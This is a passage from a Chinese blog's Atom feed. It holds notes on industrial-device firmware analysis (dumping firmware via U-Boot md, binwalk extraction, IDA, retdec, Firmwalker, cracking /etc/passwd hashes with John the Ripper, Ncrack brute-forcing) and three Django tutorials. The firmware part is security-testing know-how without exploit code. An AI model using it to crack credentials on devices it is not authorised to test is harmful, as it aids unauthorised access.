title="从串口uboot提取固件流程"></a>从串口uboot提取固件流程</h2><p>(1)获取flash固件信息<br>(2)用md命令提取固件信息<br>(3)记录串口输出信息<br>(4)分析输出信息,获取固件<br><br><br></p><h2 id="uboot提取固件-md命令"><a href="#uboot提取固件-md命令" class="headerlink" title="uboot提取固件: md命令"></a>uboot提取固件: md命令</h2><p>md - memory display (显示内存RAM/SDRAM内容)<br>用法: md 起始地址 长度 （地址和长度为十六进制格式）<br>思考: md 命令是否能提取固件？ 怎么提取固件呢？<br>可以先把flash中的内容拷贝到内存，再从内存打印<br><br><br><br></p><h1 id="固件提取技术"><a href="#固件提取技术" class="headerlink" title="固件提取技术"></a>固件提取技术</h1><p><img src="\images\pasted-177.png" alt="upload successful"><br><img src="\images\pasted-178.png" alt="upload successful"><br><img src="\images\pasted-179.png" alt="upload successful"></p><h2 id="Binwalk"><a href="#Binwalk" class="headerlink" title="Binwalk"></a>Binwalk</h2><p>提取文件命令：binwalk -e firmware.bin<br>命令：binwalk -Me firmware.bin<br>命令：binwalk -Me firmware.bin<br>命令：binwalk -Me -d 5 firmware.bin<br><br><br></p><h2 id="IDA-pro"><a href="#IDA-pro" class="headerlink" title="IDA pro"></a>IDA pro</h2><p>IDA Pro（简称IDA）是一款交互式反汇编工具<br>IDA最主要的特性是交互和多处理器<br>IDA支持的文件类型非常丰富除了常见的PE格式，还支持Windows,DOS,UNIX,Mac,Java,.NET等平台文件格式。<br><br><br></p><h2 id="retdec"><a href="#retdec" class="headerlink" title="retdec"></a>retdec</h2><p>反编译器不限于任何特定的目标架构，操作系统或可执行文件格式：<br>支持的文件格式：ELF，PE，Mach-O，COFF，AR（存档），Intel HEX和原始机器码。<br>支持的体系结构（仅限32b）：Intel x86，ARM，MIPS，PIC32和Power<br><br><br></p><h2 id="敏感信息收集工具Firmwalker"><a href="#敏感信息收集工具Firmwalker" class="headerlink" title="敏感信息收集工具Firmwalker"></a>敏感信息收集工具Firmwalker</h2><p>Firmwalker是一个非常棒的固件分析入手工具，能够帮您找到感兴趣的文件，以便进行更深入的分析<br><br><br><br></p><h1 id="固件的弱密码"><a href="#固件的弱密码" class="headerlink" title="固件的弱密码"></a>固件的弱密码</h1><h2 id="Linux密码文件"><a href="#Linux密码文件" class="headerlink" title="Linux密码文件"></a>Linux密码文件</h2><p>/etc/passwd 密码的前两位是”盐”值，是一个随机数，后面跟的是加密的密码<br>/etc/shadow 只有root可读<br><br><br></p><h2 id="etc-passwd文件简介"><a href="#etc-passwd文件简介" class="headerlink" title="/etc/passwd文件简介"></a>/etc/passwd文件简介</h2><p>adm拥有账号文件，起始目录/var/adm通常包括日志文件<br>bin拥有用户命令的可执行文件<br>daemon用来执行系统守护进程<br>games用来玩游戏<br>halt用来执行halt命令<br>lp拥有打印机后台打印文件<br>mail拥有与邮件相关的进程和文件<br>news拥有与usenet相关的进程和文件<br>nobody被NFS（网络文件系统）使用<br>shutdown执行shutdown命令<br>sync执行sync命令<br>uucp拥有uucp工具和文件<br><br><br></p><h2 id="实用破解法：社工字典法"><a href="#实用破解法：社工字典法" class="headerlink" title="实用破解法：社工字典法"></a>实用破解法：社工字典法</h2><ul><li>John the Ripper（john-1.8.0）<br>John是一款快速密码破解工具，目前支持Unix,Windows,DOS,BeOS和OpenVMS<br>主要目的是用于发现Unix弱密码另外支持许多密码hash类型，如unix系统、windows的LM<br>hash等<br><img src="\images\pasted-180.png" alt="upload successful"><br><br><br></li></ul><h1 id="固件漏洞挖掘"><a href="#固件漏洞挖掘" class="headerlink" title="固件漏洞挖掘"></a>固件漏洞挖掘</h1><p>Ncrack是一个高速的网络认证破解工具，它可以帮助企业测试所有的网络主机和网络设备的密码强度，提高企业网络的安全性。安全专业人员也可使用 Ncrack做渗透测试。<br>Ncrack支持windows和linux系统，并且可以测试暴力破解测试，支持的协议包括RDP、 SSH、 HTTP(s)、 SMB、POP3(s)、 VNC、 FTP, SIP、 Redis、 PostgreSQL、MySQL 以及Telnet。  </p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;智能设备的组成&quot;&gt;&lt;a href=&quot;#智能设备的组成&quot; class=&quot;headerlink&quot; title=&quot;智能设备的组成&quot;&gt;&lt;/a&gt;智能设备的组成&lt;/h1&gt;&lt;ul&gt;
&lt;li&gt;CPU: X86/ARM/MIPS/PPC等  &lt;/li&gt;
&lt;li&gt;内存: SDRAM/
      
    
    </summary>
    
      <category term="工控安全" scheme="http://yoururl.com/categories/%E5%B7%A5%E6%8E%A7%E5%AE%89%E5%85%A8/"/>
    
    
      <category term="ICS" scheme="http://yoururl.com/tags/ICS/"/>
    
      <category term="固件分析" scheme="http://yoururl.com/tags/%E5%9B%BA%E4%BB%B6%E5%88%86%E6%9E%90/"/>
    
  </entry>
  
  <entry>
    <title>5_Django高级</title>
    <link href="http://yoururl.com/2018/07/31/Django%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-5/"/>
    <id>http://yoururl.com/2018/07/31/Django学习笔记-5/</id>
    <published>2018-07-30T17:02:00.000Z</published>
    <updated>2018-08-06T17:58:58.000Z</updated>
    
    <content type="html"><![CDATA[<p><strong><em>django高级应用</em></strong></p><hr><p><br><br><br></p><h1 id="静态文件"><a href="#静态文件" class="headerlink" title="静态文件"></a>静态文件</h1><h2 id="管理静态文件"><a href="#管理静态文件" class="headerlink" title="管理静态文件"></a>管理静态文件</h2><p>项目中的CSS，图片，js都是静态文件</p><h2 id="配置静态文件"><a href="#配置静态文件" class="headerlink" title="配置静态文件"></a>配置静态文件</h2><ul><li><p>在settings文件中定义静态内容</p><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#逻辑规则</span></span><br><span class="line">STATIC_URL = '/static/' </span><br><span class="line"></span><br><span class="line"><span class="comment">#物理存储目录</span></span><br><span class="line">STATICFILES_DIRS = [</span><br><span class="line">   os.path.join(BASE_DIR, 'static'),</span><br><span class="line">]</span><br></pre></td></tr></table></figure></li><li><p>在项目根目录下创建static目录，再创建当前应用名称的目录</p><figure class="highlight actionscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mysite/<span class="keyword">static</span>/myapp/</span><br></pre></td></tr></table></figure></li><li><p>在模板中可以使用硬编码</p><figure class="highlight actionscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/<span class="keyword">static</span>/my_app/myexample.jpg</span><br></pre></td></tr></table></figure></li><li><p>在模板中可以使用static编码</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#123; % load static <span class="keyword">from</span> staticfiles % &#125;</span><br><span class="line">&lt;img <span class="attribute">src</span>=<span class="string">"&#123; % my_app/myexample.jpg % &#125;"</span> <span class="attribute">alt</span>=<span class="string">"My image"</span>/&gt;</span><br></pre></td></tr></table></figure></li></ul><p><br><br><br></p><h1 id="中间件"><a href="#中间件" class="headerlink" title="中间件"></a>中间件</h1><p><img src="\images\pasted-237.png" alt="upload successful"><br><img src="\images\pasted-238.png" alt="upload successful"><br><br><br><br></p><h1 id="上传图片"><a href="#上传图片" class="headerlink" title="上传图片"></a>上传图片</h1><p><img src="\images\pasted-239.png" alt="upload successful"><br><img src="\images\pasted-240.png" alt="upload successful"><br><img src="\images\pasted-241.png" alt="upload successful"><br><br><br><br></p><h1 id="Admin站点"><a href="#Admin站点" class="headerlink" title="Admin站点"></a>Admin站点</h1><p><img src="\images\pasted-242.png" alt="upload successful"></p><h2 id="ModelAdmin对象"><a href="#ModelAdmin对象" class="headerlink" title="ModelAdmin对象"></a>ModelAdmin对象</h2><p><img src="\images\pasted-245.png" alt="upload successful"></p><h3 id="列表页选项"><a href="#列表页选项" class="headerlink" title="列表页选项"></a>列表页选项</h3><p><img src="\images\pasted-246.png" alt="upload successful"><br><img src="\images\pasted-247.png" alt="upload successful"><br><img src="\images\pasted-248.png" alt="upload successful"><br><img src="\images\pasted-249.png" alt="upload successful"></p><h3 id="增加与修改页选项"><a href="#增加与修改页选项" class="headerlink" title="增加与修改页选项"></a>增加与修改页选项</h3><p><img src="\images\pasted-250.png" alt="upload successful"></p><h2 id="InlineModelAdmin对象"><a href="#InlineModelAdmin对象" class="headerlink" title="InlineModelAdmin对象"></a>InlineModelAdmin对象</h2><p><img src="\images\pasted-251.png" alt="upload successful"></p><h2 id="重写admin模板"><a href="#重写admin模板" class="headerlink" title="重写admin模板"></a>重写admin模板</h2><p><img src="\images\pasted-252.png" alt="upload successful"><br><br><br><br></p><h1 id="分页"><a href="#分页" class="headerlink" title="分页"></a>分页</h1><h2 id="Paginator对象"><a href="#Paginator对象" class="headerlink" title="Paginator对象"></a>Paginator对象</h2><p><img src="\images\pasted-253.png" alt="upload successful"></p><h2 id="Page对象"><a href="#Page对象" class="headerlink" title="Page对象"></a>Page对象</h2><p><img src="\images\pasted-254.png" alt="upload successful"><br><br><br><br></p><h1 id="使用jquery完成ajax"><a href="#使用jquery完成ajax" class="headerlink" title="使用jquery完成ajax"></a>使用jquery完成ajax</h1><p><img src="\images\pasted-255.png" alt="upload successful"></p><p><br><br><br></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;&lt;strong&gt;&lt;em&gt;django高级应用&lt;/em&gt;&lt;/strong&gt;&lt;/p&gt;
&lt;hr&gt;
&lt;p&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;/p&gt;
&lt;h1 id=&quot;静态文件&quot;&gt;&lt;a href=&quot;#静态文件&quot; class=&quot;headerlink&quot; title=&quot;静态文件&quot;&gt;&lt;/a&gt;静态文件&lt;
      
    
    </summary>
    
      <category term="Django学习笔记" scheme="http://yoururl.com/categories/Django%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
    
    
      <category term="python" scheme="http://yoururl.com/tags/python/"/>
    
      <category term="django" scheme="http://yoururl.com/tags/django/"/>
    
  </entry>
  
  <entry>
    <title>4_Django模板</title>
    <link href="http://yoururl.com/2018/07/29/Django%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-4/"/>
    <id>http://yoururl.com/2018/07/29/Django学习笔记-4/</id>
    <published>2018-07-29T10:18:00.000Z</published>
    <updated>2018-08-02T17:45:02.000Z</updated>
    
    <content type="html"><![CDATA[<p><strong><em>Templates</em></strong></p><hr><p><br><br><br></p><h1 id="模板"><a href="#模板" class="headerlink" title="模板"></a>模板</h1><p><img src="\images\pasted-149.png" alt="upload successful"></p><h2 id="模板处理"><a href="#模板处理" class="headerlink" title="模板处理"></a>模板处理</h2><p><img src="\images\pasted-150.png" alt="upload successful"></p><h2 id="快捷函数"><a href="#快捷函数" class="headerlink" title="快捷函数"></a>快捷函数</h2><p><img src="\images\pasted-151.png" alt="upload successful"><br><br><br><br></p><h1 id="定义模板"><a href="#定义模板" class="headerlink" title="定义模板"></a>定义模板</h1><p><strong><em>模板语言包括</em></strong></p><ul><li>变量</li><li>标签    </li><li>过滤器    { % 代码块 %}</li><li>注释      <h2 id="变量"><a href="#变量" class="headerlink" title="变量"></a>变量</h2><img src="\images\pasted-152.png" alt="upload successful"><h2 id="在模板中调用对象的方法"><a href="#在模板中调用对象的方法" class="headerlink" title="在模板中调用对象的方法"></a>在模板中调用对象的方法</h2><img src="\images\pasted-153.png" alt="upload successful"><h2 id="标签"><a href="#标签" class="headerlink" title="标签"></a>标签</h2><img src="\images\pasted-154.png" alt="upload successful"><br><img src="\images\pasted-155.png" alt="upload successful"><h2 id="过滤器"><a href="#过滤器" class="headerlink" title="过滤器"></a>过滤器</h2><img src="\images\pasted-156.png" alt="upload successful"><h2 id="注释"><a href="#注释" class="headerlink" title="注释"></a>注释</h2><img src="\images\pasted-157.png" alt="upload successful"><br><br><br><br></li></ul><h1 id="模板继承"><a href="#模板继承" class="headerlink" title="模板继承"></a>模板继承</h1><p><img src="\images\pasted-158.png" alt="upload successful"></p><h2 id="说明"><a href="#说明" class="headerlink" title="说明"></a>说明</h2><p><img src="\images\pasted-159.png" alt="upload successful"></p><h2 id="三层继承模型"><a href="#三层继承模型" class="headerlink" title="三层继承模型"></a>三层继承模型</h2><p><img src="\images\pasted-160.png" alt="upload successful"><br><br><br><br></p><h1 id="HTML转义"><a href="#HTML转义" class="headerlink" title="HTML转义"></a>HTML转义</h1><p><img src="\images\pasted-161.png" alt="upload successful"></p><h2 id="会被自动转义的字符"><a href="#会被自动转义的字符" class="headerlink" title="会被自动转义的字符"></a>会被自动转义的字符</h2><p><img src="\images\pasted-162.png" alt="upload successful"></p><h2 id="关闭转义"><a href="#关闭转义" class="headerlink" title="关闭转义"></a>关闭转义</h2><p><img src="\images\pasted-163.png" alt="upload successful"></p><h2 id="字符串字面值"><a href="#字符串字面值" class="headerlink" title="字符串字面值"></a>字符串字面值</h2><p><img src="\images\pasted-164.png" alt="upload successful"><br><br><br><br></p><h1 id="CSRF"><a href="#CSRF" class="headerlink" title="CSRF"></a>CSRF</h1><p><img src="\images\pasted-166.png" alt="upload successful"><br><br><br><br></p><h1 id="验证码"><a href="#验证码" class="headerlink" title="验证码"></a>验证码</h1><p><img src="\images\pasted-167.png" alt="upload successful"></p><h2 id="验证码视图"><a href="#验证码视图" class="headerlink" title="验证码视图"></a>验证码视图</h2><p><img src="\images\pasted-168.png" alt="upload successful"><br><img src="\images\pasted-169.png" alt="upload successful"><br><img src="\images\pasted-170.png" alt="upload successful"></p><h2 id="配置url"><a href="#配置url" class="headerlink" title="配置url"></a>配置url</h2><p><img src="\images\pasted-171.png" alt="upload successful"></p><h2 id="显示验证码"><a href="#显示验证码" class="headerlink" title="显示验证码"></a>显示验证码</h2><p><img src="\images\pasted-172.png" alt="upload successful"></p><h2 id="验证"><a href="#验证" class="headerlink" title="验证"></a>验证</h2><p><img src="\images\pasted-173.png" alt="upload successful"></p><h2 id="第三方"><a href="#第三方" class="headerlink" title="第三方"></a>第三方</h2><ul><li>可以在网上搜索“验证码”，找到一些第三方验证码提供网站，阅读文档，使用到项目中<br><br><br><br></li></ul>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;&lt;strong&gt;&lt;em&gt;Templates&lt;/em&gt;&lt;/strong&gt;&lt;/p&gt;
&lt;hr&gt;
&lt;p&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;/p&gt;
&lt;h1 id=&quot;模板&quot;&gt;&lt;a href=&quot;#模板&quot; class=&quot;headerlink&quot; title=&quot;模板&quot;&gt;&lt;/a&gt;模板&lt;/h1&gt;&lt;p&gt;&lt;i
      
    
    </summary>
    
      <category term="Django学习笔记" scheme="http://yoururl.com/categories/Django%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
    
    
      <category term="python" scheme="http://yoururl.com/tags/python/"/>
    
      <category term="django" scheme="http://yoururl.com/tags/django/"/>
    
  </entry>
  
  <entry>
    <title>3_Django模型</title>
    <link href="http://yoururl.com/2018/07/28/Django%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-3/"/>
    <id>http://yoururl.com/2018/07/28/Django学习笔记-3/</id>
    <published>2018-07-28T04:05:00.000Z</published>
    <updated>2018-08-02T17:45:28.000Z</updated>
    
    <content type="html"><![CDATA[<p><strong><em>Models.py</em></strong></p><hr><p><br><br><br></p><h1 id="ORM"><a href="#ORM" class="headerlink" title="ORM"></a>ORM</h1><h2 id="对象-关系-映射"><a href="#对象-关系-映射" class="headerlink" title="对象-关系-映射"></a>对象-关系-映射</h2><p>根据对象的类型生成表结构<br>将对象，列表的操作，转换为sql语句<br>将sql查询到的结果转换为对象，列表  </p><p>Django中的模型包含存储数据的字段和约束，对应着数据库中唯一的表<br><img src="\images\pasted-75.png" alt="upload successful"><br><br></p><h2 id="使用mysql数据库"><a href="#使用mysql数据库" class="headerlink" title="使用mysql数据库"></a>使用mysql数据库</h2><p>pip install mysql-python</p><ul><li>在mysql中创建数据库<br>create database test2 charest=utf8;</li><li>打开settings.py文件，修改DATABASES项<br>可以看到我们现在用的是sqlite3这个数据库(自己生成一个db.sqlite3数据库文件)<br><img src="\images\pasted-77.png" alt="upload successful"><br><img src="\images\pasted-79.png" alt="upload successful"><br>settings.py中改个配置就可以用我们的mysql数据库<br><img src="\images\pasted-76.png" alt="upload successful"><br><img src="\images\pasted-78.png" alt="upload successful"><br><br></li></ul><h2 id="开发流程"><a href="#开发流程" class="headerlink" title="开发流程"></a>开发流程</h2><p><img src="\images\pasted-81.png" alt="upload successful"></p><h2 id="使用已有数据库生成模型类"><a href="#使用已有数据库生成模型类" class="headerlink" title="使用已有数据库生成模型类"></a>使用已有数据库生成模型类</h2><p>python manage.py inspectdb &gt; booktest/models.py<br><br><br><br></p><h1 id="创建添加应用"><a href="#创建添加应用" class="headerlink" title="创建添加应用"></a>创建添加应用</h1><p>python manage.py startapp booktest<br>创建应用之后需要把应用booktest添加到settings.py的INSTALLED_APPS<br><img src="\images\pasted-82.png" alt="upload successful"></p><h2 id="定义模型"><a href="#定义模型" class="headerlink" title="定义模型"></a>定义模型</h2><p><img src="\images\pasted-83.png" alt="upload successful"></p><h2 id="定义属性"><a href="#定义属性" class="headerlink" title="定义属性"></a>定义属性</h2><p><img src="\images\pasted-84.png" alt="upload successful"></p><h2 id="字段类型"><a href="#字段类型" class="headerlink" title="字段类型"></a>字段类型</h2><p><img src="\images\pasted-85.png" alt="upload successful"></p><h2 id="字段选项"><a href="#字段选项" class="headerlink" title="字段选项"></a>字段选项</h2><p><img src="\images\pasted-86.png" alt="upload successful"></p><h2 id="关系"><a href="#关系" class="headerlink" title="关系"></a>关系</h2><p><img src="\images\pasted-87.png" alt="upload successful"><br><br><br></p><h1 id="示例"><a href="#示例" class="headerlink" title="示例"></a>示例</h1><ul><li>在models.py中定义表结构<br><img src="\images\pasted-88.png" alt="upload successful"></li><li>生成迁移之后<br>python manage.py makemigrations<br><img src="\images\pasted-89.png" alt="upload successful"></li><li>执行迁移之后<br>python manage.py migrate<br><img src="\images\pasted-90.png" alt="upload successful"><br><br><br></li></ul><h1 id="类的属性"><a href="#类的属性" class="headerlink" title="类的属性"></a>类的属性</h1><p><img src="\images\pasted-91.png" alt="upload successful"></p><h2 id="管理器（可自定义）"><a href="#管理器（可自定义）" class="headerlink" title="管理器（可自定义）"></a>管理器（可自定义）</h2><p>模型类—&gt;管理器—&gt;数据库（管理器是模型类的一个属性，用于将对象和数据表映射）<br><img src="\images\pasted-92.png" alt="upload successful"><br><img src="\images\pasted-93.png" alt="upload successful"><br><img src="\images\pasted-94.png" alt="upload successful"><br><img src="\images\pasted-95.png" alt="upload successful"></p><h2 id="模型类的创建方法"><a href="#模型类的创建方法" class="headerlink" title="模型类的创建方法"></a>模型类的创建方法</h2><p>&emsp;&emsp;在自定义的模型类中写<strong>init</strong>方法时会报错，因为model.Model中已经有了<strong>init</strong>方法，那我们怎么快捷创建每个模型类呢？<br><strong><em>解决方法：</em></strong>  </p><ul><li>(1) 创建<strong><em>类方法</em></strong>。 我们在模型类中，自定义一个创建模型类的方法<br><img src="\images\pasted-96.png" alt="upload successful"><br>我们在python manage.py shell中，创建一个abc对象：<br><img src="\images\pasted-97.png" alt="upload successful"><br>报错是因为时区问题，不影响<br><img src="\images\pasted-98.png" alt="upload successful"></li><li>(2) 在<strong><em>自定义的管理器</em></strong>中，创建对象方法 （不在类中做这件事）<br><img src="\images\pasted-99.png" alt="upload successful"><br><img src="\images\pasted-100.png" alt="upload successful"><br><img src="\images\pasted-101.png" alt="upload successful"><br><br><br></li></ul><h1 id="模型查询"><a href="#模型查询" class="headerlink" title="模型查询"></a>模型查询</h1><p><img src="\images\pasted-102.png" alt="upload successful"></p><h2 id="查询集"><a href="#查询集" class="headerlink" title="查询集"></a>查询集</h2><p><img src="\images\pasted-103.png" alt="upload successful"></p><h3 id="限制查询集"><a href="#限制查询集" class="headerlink" title="限制查询集"></a>限制查询集</h3><p><img src="\images\pasted-104.png" alt="upload successful"></p><h3 id="查询集的缓存"><a href="#查询集的缓存" class="headerlink" title="查询集的缓存"></a>查询集的缓存</h3><p><img src="\images\pasted-105.png" alt="upload successful"></p><h2 id="字段查询"><a href="#字段查询" class="headerlink" title="字段查询"></a>字段查询</h2><p><img src="\images\pasted-106.png" alt="upload successful"></p><h3 id="比较运算符"><a href="#比较运算符" class="headerlink" title="比较运算符"></a>比较运算符</h3><p><img src="\images\pasted-107.png" alt="upload successful"><br><img src="\images\pasted-108.png" alt="upload successful"><br><br><br></p><h1 id="聚合函数"><a href="#聚合函数" class="headerlink" title="聚合函数"></a>聚合函数</h1><p><img src="\images\pasted-109.png" alt="upload successful"></p><h2 id="F对象"><a href="#F对象" class="headerlink" title="F对象"></a>F对象</h2><p><img src="\images\pasted-110.png" alt="upload successful"></p><h2 id="Q对象"><a href="#Q对象" class="headerlink" title="Q对象"></a>Q对象</h2><p><img src="\images\pasted-111.png" alt="upload successful"></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;&lt;strong&gt;&lt;em&gt;Models.py&lt;/em&gt;&lt;/strong&gt;&lt;/p&gt;
&lt;hr&gt;
&lt;p&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;/p&gt;
&lt;h1 id=&quot;ORM&quot;&gt;&lt;a href=&quot;#ORM&quot; class=&quot;headerlink&quot; title=&quot;ORM&quot;&gt;&lt;/a&gt;ORM&lt;/h1&gt;&lt;
      
    
    </summary>
    
      <category term="Django学习笔记" scheme="http://yoururl.com/categories/Django%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
    
    
      <category term="python" scheme="http://yoururl.com/tags/python/"/>
    
      <category term="django" scheme="http://yoururl.com/tags/django/"/>
    
  </entry>
  
</feed>
